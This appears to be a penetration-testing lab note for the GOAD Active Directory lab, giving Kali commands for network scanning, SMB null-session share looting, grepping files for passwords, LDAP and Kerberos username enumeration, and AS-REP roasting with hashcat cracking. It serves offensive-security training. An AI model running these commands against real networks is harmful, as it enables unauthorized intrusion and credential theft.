---
title: GOAD - Enumeration - Initial Recon
category: Enumeration
environment: GOAD
execution_context: "[KALI]"
privileges: User
tags:
  - GOAD
  - Enumeration
  - Recon
  - ActiveDirectory
  - SMB
  - Kerberos
date_created: 2026-08-23
status: VERIFY-BEFORE-USE
---

# GOAD — Enumeration: Initial Recon

> [!WARNING]
> This documentation is for the **authorized GOAD lab environment only**.

> [!IMPORTANT]
> Complete [[GOAD - Environment Setup and Validation]] before running any commands in this note.
> Confirm all IPs against [[GOAD - IP Hostname Matrix]] — do NOT use unverified IPs.

---

## Objective

Enumerate the GOAD Active Directory environment from an unauthenticated (or low-privilege) position on Kali.

---

## Prerequisites

- [ ] GOAD environment is running
- [ ] Kali can reach 192.168.56.0/24 (verified with ping)
- [ ] /etc/hosts is configured with verified GOAD hostnames
- [ ] impacket, crackmapexec, nmap, smbclient are installed on Kali

---

## Execution Context Note

> [!IMPORTANT]
> **All commands in this note are Kali Bash commands — NOT Mythic tasks.**
> These run before any Mythic agent is deployed.

---

## Step 1 — Network Discovery

```
Execution Context: [KALI]
Shell: Bash
Privileges: User (some nmap scans may need sudo)
```

```bash
# Discover live hosts
sudo nmap -sn 192.168.56.0/24

# Record which hosts respond
# Compare with [[GOAD - IP Hostname Matrix]]
```

**Expected live hosts:** 5 GOAD VMs + Kali itself.

---

## Step 2 — Port Scan Domain Controllers

```
Execution Context: [KALI]
Shell: Bash
Privileges: User
```

> [!IMPORTANT]
> Replace IPs with verified values from [[GOAD - IP Hostname Matrix]].

```bash
# Scan DC ports on King's Landing (sevenkingdoms.local)
nmap -sV -p 88,389,445,636,3268,3269,3389,5985 192.168.56.10

# Scan DC ports on Winterfell (north.sevenkingdoms.local)
nmap -sV -p 88,389,445,636,3268,3269,3389,5985 192.168.56.11

# Scan DC ports on Meereen (essos.local)
nmap -sV -p 88,389,445,636,3268,3269,3389,5985 192.168.56.12

# Scan member servers
nmap -sV -p 445,3389,80,443,8080,5985 192.168.56.22
nmap -sV -p 445,3389,80,443,8080,5985 192.168.56.23
```

**Key ports to identify:**

| Port | Service | Significance |
|---|---|---|
| 88 | Kerberos | Confirms DC |
| 389 | LDAP | AD enumeration |
| 445 | SMB | File sharing, attacks |
| 636 | LDAPS | Encrypted LDAP |
| 3268 | Global Catalog | Forest-wide queries |
| 5985 | WinRM | Remote PowerShell |
| 3389 | RDP | Remote Desktop |

---

## Step 3 — SMB Null Session Enumeration

```
Execution Context: [KALI]
Shell: Bash
Privileges: User
```

```bash
# List shares with null session
smbclient -L //192.168.56.10 -N
smbclient -L //192.168.56.11 -N
smbclient -L //192.168.56.12 -N
smbclient -L //192.168.56.22 -N
smbclient -L //192.168.56.23 -N
```

**Expected result for GOAD:** Some shares may be accessible without authentication (intentional vulnerability).

```bash
# If a share is accessible, browse it
smbclient //192.168.56.22/Share -N

# Download all accessible files
smbget -R smb://192.168.56.22/Share -U guest%

# Search for credentials in downloaded files
grep -ri "password\|credential\|Pass" ./Share/ 2>/dev/null
```

---

## Step 4 — CrackMapExec SMB Sweep

```
Execution Context: [KALI]
Shell: Bash
Privileges: User
```

```bash
# Enumerate with null session (unauthenticated)
crackmapexec smb 192.168.56.0/24

# Expected: Hostnames, OS versions, SMB signing status
```

**Record from output:**
- Hostname of each host
- Windows version
- SMB signing (`signing: True` = PtH relay blocked, `signing: False` = relay possible)

---

## Step 5 — LDAP Anonymous Enumeration

```
Execution Context: [KALI]
Shell: Bash
Privileges: User
```

```bash
# Test anonymous LDAP bind
ldapsearch -H ldap://192.168.56.10 -x -b "" -s base namingContexts

# If anonymous allowed, enumerate base DNs
ldapsearch -H ldap://192.168.56.10 -x -b "DC=sevenkingdoms,DC=local" "(objectClass=*)" cn sAMAccountName
```

> [!NOTE]
> Anonymous LDAP is often disabled by default. GOAD may allow it on some hosts — test and record the result.

---

## Step 6 — Kerbrute — Username Enumeration

```
Execution Context: [KALI]
Shell: Bash
Privileges: User
```

> [!IMPORTANT]
> Replace the DC IP and domain with verified values from [[GOAD - IP Hostname Matrix]].

```bash
# Download kerbrute if not installed
# https://github.com/ropnop/kerbrute

# Enumerate valid usernames against the DC
./kerbrute userenum --dc 192.168.56.10 -d sevenkingdoms.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

# GOAD-specific known users to test
./kerbrute userenum --dc 192.168.56.10 -d sevenkingdoms.local - << 'USERS'
Administrator
vagrant
arya.stark
jon.snow
sansa.stark
samwell.tarly
tyrion.lannister
hodor
daenerys.targaryen
walder.frey
cersei.lannister
jaime.lannister
USERS
```

> [!NOTE]
> The username list above is based on the known GOAD character set. Not all users may exist in all domain variants.

---

## Step 7 — AS-REP Roasting (No Auth Required)

```
Execution Context: [KALI]
Shell: Bash
Privileges: User
Prerequisite: Valid username list from Step 6
```

```bash
# Check for accounts with DONT_REQ_PREAUTH
# Replace DC IP and domain with verified values
impacket-GetNPUsers sevenkingdoms.local/ -dc-ip 192.168.56.10 -usersfile known_users.txt -no-pass -format hashcat
```

**Expected result for GOAD:** Some accounts (e.g., `hodor`, `arya.stark`) may be configured with DONT_REQ_PREAUTH.

```bash
# If hashes obtained, crack with hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Enumeration Results Template

Fill in after completing steps above:

| Host | IP | Hostname | OS | SMB Signing | Null Session | Notes |
|---|---|---|---|---|---|---|
| VERIFY | 192.168.56.10 | VERIFY | VERIFY | VERIFY | VERIFY | |
| VERIFY | 192.168.56.11 | VERIFY | VERIFY | VERIFY | VERIFY | |
| VERIFY | 192.168.56.12 | VERIFY | VERIFY | VERIFY | VERIFY | |
| VERIFY | 192.168.56.22 | VERIFY | VERIFY | VERIFY | VERIFY | |
| VERIFY | 192.168.56.23 | VERIFY | VERIFY | VERIFY | VERIFY | |

---

## Common Mistakes

- Running enumeration before confirming GOAD VMs are running
- Using unverified IPs from existing notes (see ERROR 01 in [[GOAD - Error Audit and Contradiction Report]])
- Using domain names that don't match the actual deployed topology
- Confusing `shell` (Mythic task) with Kali bash commands
- Cracking hashes on the Mythic server instead of Kali

---

## Related Notes

- [[GOAD - IP Hostname Matrix]]
- [[GOAD - Environment Setup and Validation]]
- [[GOAD - Active Directory - BloodHound Collection]]
- [[GOAD - Exploitation - Initial Access Vectors]]
